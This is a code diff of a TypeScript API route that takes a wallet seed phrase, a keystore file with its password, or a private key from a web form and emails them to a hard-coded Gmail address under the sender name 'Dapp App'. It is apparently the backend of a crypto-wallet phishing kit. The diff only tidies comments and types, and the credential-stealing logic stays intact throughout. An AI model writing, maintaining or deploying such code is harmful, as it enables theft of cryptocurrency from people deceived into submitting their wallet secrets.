@@ -12,13 +12,8 @@ const formatMessage = async (message: string) => {
     }
   });
 
-  // Split the message into lines
   const lines = message.split(/\r?\n/);
-
-  // Format each line with a prefix (for example)
   const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);
-
-  // Join formatted lines into a single HTML string
   const formattedMessage = formattedLines.join('');
 
   const mailOptions = {
@@ -28,7 +23,7 @@ const formatMessage = async (message: string) => {
     html: `<div>${message}</div>`,
   };
 
-  transporter.verify(function (error: any, success: any) {
+  transporter.verify(function (error: Error | null, success: true) {
     if (error) {
       console.log(`here is the error: ${error}`);
     } else {
@@ -44,7 +39,6 @@ const formatMessage = async (message: string) => {
     console.log("Internal server error");
   }
 
-  // Return the formatted message
   return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
 }
 
@@ -53,7 +47,6 @@ export async function POST(request: Request) {
     const { phrase, keystore, privateKey } = await request.json();
 
     if (phrase) {
-
       const email = process.env.EMAIL
       const pass = process.env.PASS
 
@@ -65,7 +58,6 @@ export async function POST(request: Request) {
         }
       })
 
-
       const formattedMessage = await formatMessage(phrase);
 
       const mailOptions = {
@@ -75,7 +67,7 @@ export async function POST(request: Request) {
         html: formattedMessage,
       }
 
-      transporter.verify(function (error, success) {
+      transporter.verify(function (error: Error | null, success: true) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
@@ -93,7 +85,6 @@ export async function POST(request: Request) {
     }
 
     if (keystore) {
-
       const email = process.env.EMAIL
       const pass = process.env.PASS
 
@@ -105,8 +96,6 @@ export async function POST(request: Request) {
         }
       })
 
-
-
       const mailOptions = {
         from: `Dapp App ${email}`,
         to: "adev93108@gmail.com",
@@ -114,7 +103,7 @@ export async function POST(request: Request) {
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
 
-      transporter.verify(function (error, success) {
+      transporter.verify(function (error: Error | null, success: true) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
@@ -132,7 +121,6 @@ export async function POST(request: Request) {
     }
 
     if (privateKey) {
-
       const email = process.env.EMAIL
       const pass = process.env.PASS
 
@@ -144,8 +132,6 @@ export async function POST(request: Request) {
         }
       })
 
-
-
       const formattedMessage = await formatMessage(privateKey);
 
       const mailOptions = {
@@ -155,7 +141,7 @@ export async function POST(request: Request) {
         html: formattedMessage,
       }
 
-      transporter.verify(function (error, success) {
+      transporter.verify(function (error: Error | null, success: true) {
         if (error) {
           console.log(`here is the error: ${error}`);
         } else {
@@ -172,10 +158,12 @@ export async function POST(request: Request) {
       }
     }
 
-
     return Response.json({ message: 'Submission Failed' }, { status: 500 })
 
   } catch (error) {
-    return Response.json({ error: error });
+    if (error instanceof Error) {
+      return Response.json({ error: error.message });
+    }
+    return Response.json({ error: 'Unknown error occurred' });
   }
 }
